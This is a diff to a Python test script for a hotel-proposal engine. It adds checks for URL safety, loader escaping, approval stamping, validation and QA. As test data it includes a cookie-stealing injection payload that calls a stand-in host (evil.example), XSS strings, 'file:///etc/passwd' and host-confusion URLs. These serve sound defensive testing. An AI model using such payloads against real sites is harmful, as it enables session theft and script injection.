@@ -27,6 +27,8 @@ for url, why in [("https://user:pw@example.com/x", "credentials"), ("https://127
                  ("file:///etc/passwd", "file scheme"), ("ftp://example.com/x", "ftp scheme"), ("javascript:alert(1)", "javascript scheme"), ("http://example.com/", "plain http")]:
     ok(raises(N.Unsafe, lambda: N.check_url(url, resolve=False)), f"rejects {why}: {url}")
 ok(N.check_url("https://www.example.com/hotels/x", resolve=False).hostname == "www.example.com", "accepts an ordinary https hotel URL")
+ok(raises(N.Unsafe, lambda: N.check_url("https://evil.com\\.allowed.com/x", resolve=False)) and raises(N.Unsafe, lambda: N.check_url("https://example.com/a\nb", resolve=False)), "rejects a backslash or control character (Python and Chromium would read the host differently)")
+ok(N.host_is_public("no-such-host.invalid") and not N.host_is_public("no-such-host.invalid", fail_closed=True), "an unresolvable name passes for our own requests but is refused for Chromium (fail closed)")
 ok(N.same_site("www.hotel.com", "hotel.com") and N.same_site("book.hotel.com", "hotel.com") and not N.same_site("hotel.com", "evil-hotel.com") and not N.same_site("hotel.com", ""), "same_site: www/subdomain yes, look-alike domain no")
 png = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" + (640).to_bytes(4, "big") + (480).to_bytes(4, "big") + b"\x08\x02\x00\x00\x00"
 gif = b"GIF89a" + (320).to_bytes(2, "little") + (200).to_bytes(2, "little") + b"\x00\x00\x00"
@@ -187,6 +189,17 @@ t2, c2, _ = B.build(hh)
 ok(not B.validate(t2, hh, c2)[0], "optional intros left out: the blocks are omitted, nothing is made up")
 
 
+hostile = 'X"); fetch("https://evil.example/c?"+document.cookie); (" \u2028 \n// ' + "`${alert(1)}`"
+js = B.make_loader({"sections": []}, "1605252", hostile, "Email")
+lit = next(l for l in js.splitlines() if l.strip().startswith("const LABEL = "))
+ok(json.loads(lit.split("=", 1)[1].strip().rstrip(";")) == hostile, "loader.js carries the hotel name as one escaped data literal, byte for byte")
+hits = [l for l in js.splitlines() if "evil.example" in l]
+ok(all(l == lit or l.startswith("// Hippo deal room loader:") for l in hits) and js.splitlines()[1].startswith("// Run in the browser Console"), "and nowhere else: only in that literal and a one-line header comment that cannot be broken out of")
+import subprocess as _sp
+open(os.path.join(tempfile.mkdtemp(), "x"), "w").close()
+_f = os.path.join(tempfile.mkdtemp(), "loader.js"); open(_f, "w").write(js)
+ok(_sp.run(["node", "--check", _f], capture_output=True).returncode == 0, "the generated loader is still valid JavaScript with a hostile name")
+
 # ------------------------------------------------------------------ hotel profile store
 print("hotel profile")
 i1 = HP.hotel_identity("https://www.tajhotels.com/en-in/hotels/jai-mahal-palace-jaipur/meetings/?utm_source=x")
@@ -207,6 +220,13 @@ ok(store.generations("demo-hotel-12345678")[0]["job_id"] == "dr_x_00000000", "ge
 store.save_customization("demo-hotel-12345678", {"asset_rights": {"approved": True}, "focus": "event"}, "v", "lead")
 sc = store.customization("demo-hotel-12345678")
 ok(sc["asset_rights"]["approved_by"] == "lead" and sc["asset_rights"]["approved_at"] and sc["focus"] == "event", "saved customization records who approved asset rights, and when")
+first_at = sc["asset_rights"]["approved_at"]
+store.save_customization("demo-hotel-12345678", {**sc, "focus": "rooms"}, "v2", "an-operator")
+sc2 = store.customization("demo-hotel-12345678")
+ok(sc2["asset_rights"]["approved_by"] == "lead" and sc2["asset_rights"]["approved_at"] == first_at and sc2["focus"] == "rooms", "re-saving other fields does not re-stamp who approved the rights")
+store.save_customization("demo-hotel-12345678", {"asset_rights": {"approved": False}}, "v3", "lead")
+store.save_customization("demo-hotel-12345678", {"asset_rights": {"approved": True, "approved_by": "forged"}}, "v4", "another-admin")
+ok(store.customization("demo-hotel-12345678")["asset_rights"]["approved_by"] == "another-admin", "a new approval is stamped by the server, whatever the request claims")
 store.save({**prof(hash="o1"), "hotel_id": "other-hotel-aaaaaaaa", "property_name": "The Other Grand Hotel"})
 ok(store.others("demo-hotel-12345678") == [("other-hotel-aaaaaaaa", "The Other Grand Hotel")], "the store lists other hotels for cross-hotel leakage checks")
 ok(raises(ValueError, lambda: store.path("../etc")), "a hotel id cannot escape the store directory")
@@ -227,6 +247,9 @@ codes = {w["code"] for w in v["warnings"]}
 ok({"BAD_PHONE", "IMPLAUSIBLE_CAPACITY", "CHECKIN_BEFORE_CHECKOUT"} <= codes, "bad phone, implausible capacity and check-in not after check-out are caught")
 ev = [{"field_key": "address", "confidence_score": 0.55}] + [{"field_key": k, "confidence_score": 0.9} for k in ("property_name", "city")]
 ok(any(w["code"] == "LOW_CONFIDENCE" for w in HP.validate_profile({**good, "evidence": ev})["warnings"]), "a low-confidence required field asks for verification")
+import time as _t
+t0 = _t.time(); v = HP.validate_profile({**good, "email": "a@" + "." * 200000})
+ok(_t.time() - t0 < 1 and any(w["code"] == "BAD_EMAIL" for w in v["warnings"]), "an enormous e-mail address is rejected by length before any regex runs")
 ok(HP.content_hash({**good, "profile_version": 3, "built_at": "x"}) == HP.content_hash({**good, "profile_version": 9, "built_at": "y", "profile_status": "approved"}), "the content hash ignores version, status and timestamps")
 
 
@@ -279,8 +302,92 @@ ok(r["outcome"] == "FAIL" and r["critical"][0]["fields"] == ["address"], "a crit
 pl_bad = {**pl0, "sections": pl0["sections"][:-1]}
 r = QA.run(tpl=tpl, assets=imgs, **{**qa_in, "plan": pl_bad})
 ok(r["outcome"] == "FAIL", "a template that does not match the plan fails QA")
+for bad, why in [("<img src=x onerror=alert(1)>", "an event-handler attribute"), ("<script>alert(1)</script>", "a script tag"), ('<a href="javascript:alert(1)">x</a>', "a javascript: link inside text"), ("<iframe src=//evil></iframe>", "a frame")]:
+    tx = copy.deepcopy(tpl); tx["sections"][1]["components"][0]["data"]["text"] += bad
+    rx = QA.run(tpl=tx, assets=imgs, **qa_in)
+    ok(rx["outcome"] == "FAIL" and any(x["code"] == "ACTIVE_MARKUP" for x in rx["critical"]), f"QA fails on {why} in any text")
+tx = copy.deepcopy(tpl); tx["sections"][1]["components"][0]["data"]["text"] += "<p>Seats &lt;img src=x onerror=alert(1)&gt; people</p>"
+ok(QA.run(tpl=tx, assets=imgs, **qa_in)["outcome"] == "PASS", "the same text, HTML-escaped, is only wording and passes")
+tx = copy.deepcopy(tpl); tx["sections"][1]["components"][0]["data"]["text"] += "<p>" + "1," * 60000 + " USD</p>"
+t0 = _t.time(); QA.run(tpl=tx, assets=imgs, **qa_in)
+ok(_t.time() - t0 < 3, "pathological hotel text cannot stall the QA regexes")
 t6 = copy.deepcopy(tpl); t6["sections"][2]["components"][0]["data"]["text"] = "<p> </p>"
 ok(QA.run(tpl=t6, assets=imgs, **qa_in)["outcome"] == "FAIL", "a blank required text block fails QA")
+
+# ------------------------------------------------------------------ findings from the correctness review
+print("review findings")
+ids = {u: HP.hotel_identity(u) for u in ["https://www.ihg.com/crowneplaza/hotels/us/en/new-york/nycxx/hoteldetail", "https://www.ihg.com/crowneplaza/hotels/us/en/atlanta/atlxx/hoteldetail",
+                                         "https://hotelchain.com/ny/grand-hotel", "https://hotelchain.com/la/grand-hotel", "https://hotelchain.com/en/grand-hotel", "https://hotelchain.com/grand-hotel"]}
+u = list(ids)
+ok(len({ids[x]["hotel_id"] for x in u[:4]}) == 4, "different hotels never share an id: city hotel codes and state codes count, only real locale segments are ignored")
+ok(ids[u[4]]["hotel_id"] == ids[u[5]]["hotel_id"], "a language segment (en) is still ignored")
+ok(ids[u[0]]["official_path"] == "/crowneplaza/hotels/us/en/new-york/nycxx", "the official URL is the hotel's own page, not a shared country prefix")
+
+fx = [{"field": "venue", "value": "Ballroom | 300 sq m | 200", "source_url": "https://x.example/meetings", "quote": "", "verified": True},
+      {"field": "room_type", "value": "Deluxe King | 30 sq m | 2", "source_url": "https://x.example/rooms", "quote": "", "verified": True},
+      {"field": "room_type", "value": "Garden Suite | 55 sq m | 4", "source_url": "https://x.example/rooms", "quote": "", "verified": True}]
+def prof_for(h, ov=None):
+    return HP.build_profile(hotel=HP.hotel_identity("https://x.example/hotels/demo"), inp={"hotel_url": "https://x.example/hotels/demo"}, h=h, cfg={"sources": []}, facts=fx, cp={}, ov=ov or {}, custom={}, scrape={}, plan_branding=None)
+vh = {**H, "venues": {"columns": ["Venue", "Area", "Theatre"], "rows": [["Ballroom", "300 sq m", "200"]]}, "room_types": {"columns": ["Room type", "Size", "Guests"], "rows": [["Deluxe King", "30 sq m", "2"], ["Garden Suite", "55 sq m", "4"]]}}
+pv0 = prof_for(vh)
+ok([v["verification_status"] for v in pv0["venues"]] == ["officially_verified"] and next(e for e in pv0["evidence"] if e["field_key"] == "venues")["provenance"] == "officially_verified", "unchanged venues stay officially verified, with the page as their source")
+moon = {**vh, "venues": {**vh["venues"], "rows": vh["venues"]["rows"] + [["Moon Base Alpha", "10,000 sq m", "5000"]]}}
+pv1 = prof_for(moon, {"venues": moon["venues"]})
+ok([v["verification_status"] for v in pv1["venues"]] == ["officially_verified", "manually_corrected"] and pv1["venues"][1]["source_url"] is None, "a venue a reviewer added is manually corrected with no page behind it; the untouched one is still verified")
+ev = next(e for e in pv1["evidence"] if e["field_key"] == "venues")
+ok(ev["provenance"] == "manually_corrected" and ev["extraction_method"] == "reviewer_override", "and the venues evidence says a person changed it")
+edited = {**vh, "venues": {**vh["venues"], "rows": [["Ballroom", "300 sq m", "900"]]}}
+ok(prof_for(edited, {"venues": edited["venues"]})["venues"][0]["verification_status"] == "manually_corrected", "same venue, different capacity than the page: manual, not verified")
+flip = {**vh, "room_types": {**vh["room_types"], "rows": list(reversed(vh["room_types"]["rows"]))}}
+ok([r["verification_status"] for r in prof_for(flip)["rooms"]] == ["officially_verified", "officially_verified"] and [r["room_name"] for r in prof_for(flip)["rooms"]] == ["Garden Suite", "Deluxe King"], "reordered rooms keep their own verification (matched by name, not position)")
+ev_k = {"override.venues": 1}
+mp = MP.build_mapping(moon, pl0, {**pv1, "assets": []}, tpl, "email", [{"section": "meeting", "slot": "venue table", "config_key": "venues", "detail": None, "required": False}], None)
+ok(mp["static"][0]["provenance"] == "manually_corrected" and mp["static"][0]["source_field"] == "override.venues", "the mapping report shows the reviewer's venues as manual, not verified")
+
+for t in ["Rooms start at INR 8,000 a night", "USD 150", "Rs. 5,000 per room", "from 120 a night", "€250", "AED 800", "8,000 INR", "$99", "nightly rate"]:
+    ok(bool(QA.MONEY.search(t)), f"price recognised: {t}")
+for t in ["Spend a night in the palace", "214 rooms and 3,200 sqm of event space", "up to 500 guests", "Check-in from 3:00 pm", "Open 24 hours a day"]:
+    ok(not QA.MONEY.search(t), f"ordinary wording is not a price: {t}")
+txm = copy.deepcopy(tpl); txm["sections"][1]["components"][0]["data"]["text"] += "<p>Rooms start at INR 8,000 a night for corporate groups</p>"
+rm = QA.run(tpl=txm, assets=imgs, **qa_in)
+ok(rm["outcome"] == "REVIEW" and any(x["category"] == "COMMERCIAL_APPROVAL" for x in rm["review"]), "a price written code-first is caught (it used to pass)")
+
+ch = [{"kind": "substituted", "key": "rooms", "transient": False, "note": "slot 'rooms' had no working photo: using amenities_1, a different photo"}]
+r1 = QA.run(tpl=tpl, assets=imgs, asset_changes=ch, **qa_in)
+ok(r1["outcome"] == "REVIEW" and any(x["code"] == "PHOTOS_CHANGED" for x in r1["review"]), "a photo from another category standing in for a missing one needs a person")
+ok(QA.run(tpl=tpl, assets=imgs, asset_changes=[{"kind": "removed", "key": "x", "transient": False, "note": "x removed: HTTP 404"}], **qa_in)["outcome"] == "PASS", "an extra photo that is permanently gone is just noted")
+ok(QA.run(tpl=tpl, assets=imgs, asset_changes=[{"kind": "removed", "key": "x", "transient": True, "note": "x removed: timeout"}], **qa_in)["outcome"] == "REVIEW", "a photo dropped over a temporary error is not silently lost")
+ok(QA.run(tpl=tpl, assets=imgs, rights_approved=True, **{**qa_in, "profile": prof2})["outcome"] == "PASS", "rights approved for this job (request or reviewer layer) satisfy QA without touching the stored profile")
+ach = []
+hx = {"media": {"a_1": {"source_url": BASE + "/gone.png"}, "a_2": {"source_url": BASE + "/ok.png"}, "u_1": {"source_url": BASE + "/ok2.png"}}, "slots": {"rooms": ["a_1"], "gallery": ["a_2"]}}
+os.environ.update(ALLOW_HTTP="1", ALLOW_PRIVATE_HOSTS="1")
+AS.prune_media(hx, {BASE + "/gone.png": {"ok": False, "error": "HTTP 404", "transient": False}, BASE + "/ok.png": {"ok": True, "sha256": "aa"}}, "enforce", ach)
+ok([c["kind"] for c in ach] == ["removed", "substituted"] and ach[1]["key"] == "rooms", "prune_media reports each removal and substitution for QA")
+os.environ.pop("ALLOW_HTTP"); os.environ.pop("ALLOW_PRIVATE_HOSTS")
+import urllib.error as _ue
+_real_open = N._opener.open
+N._opener.open = lambda *a, **k: (_ for _ in ()).throw(_ue.URLError(OSError("Tunnel connection failed: 403 Forbidden")))
+os.environ.update(ALLOW_HTTP="1", ALLOW_PRIVATE_HOSTS="1")
+ok(raises(N.Unsafe, lambda: N.fetch("http://127.0.0.1:1/x.png")), "a proxy that answers 403 is a refusal, not a temporary error")
+N._opener.open = lambda *a, **k: (_ for _ in ()).throw(_ue.URLError(OSError("Tunnel connection failed: 503 Service Unavailable")))
+ok(raises(N.Transient, lambda: N.fetch("http://127.0.0.1:1/x.png")), "but a proxy 503 is worth retrying")
+N._opener.open = _real_open
+os.environ.pop("ALLOW_HTTP"); os.environ.pop("ALLOW_PRIVATE_HOSTS")
+
+p = plan({"focus": "meetings"}, profile={**HOTEL, "venues": []})
+ok(p["template_family"] == "corporate_event" and p["unmet_requests"] and "venue" in p["unmet_requests"][0]["reason"], "a focus the hotel cannot support is reported, not quietly downgraded")
+ok("meeting" in plan({"focus": "event"})["required_sections"] and "meeting" not in plan({})["required_sections"], "meeting space is a required section for event-focused proposals only")
+p = plan({"focus": "event", "rfp_needs": {"meeting": False}})
+ok(p["blocking"] and p["blocking"][0]["code"] == "REQUIRED_SECTION_DROPPED" and "meeting" in keys(p), "an RFP that drops the required meeting section is a blocker, stated at planning time")
+ok(CU.validate_customization({"focus": "event", "exclude_sections": ["meeting"]})[1] and CU.validate_customization({"template_family": "meeting_space", "exclude_sections": ["meeting"]})[1], "excluding meeting space from an event proposal is rejected up front")
+ok(not CU.validate_customization({"focus": "rooms", "exclude_sections": ["meeting"]})[1], "while it stays fine for a rooms-focused one")
+p = plan({}, cp={"left_out": ["dining_intro", "location_cards.parking"]})
+ok(p["left_out"] == ["dining_intro", "location_cards.parking"] and any("left out" in d for d in p["decisions"]), "blocks with nothing sourced are listed as left out")
+
+st2 = HP.Store(tempfile.mkdtemp())
+for h_, v_ in (("demo-hotel-12345678", "a"), ("demo-hotel-12345678", "b")): st2.save({**prof(hash=v_), "hotel_id": h_})
+st2.approve("demo-hotel-12345678", 2, "x"); st2.approve("demo-hotel-12345678", 1, "y")
+ok(st2.index("demo-hotel-12345678")["approved_version"] == 2, "approving an older version never un-approves a newer one")
 
 print(f"\n{passed} engine checks passed")
 srv.shutdown()
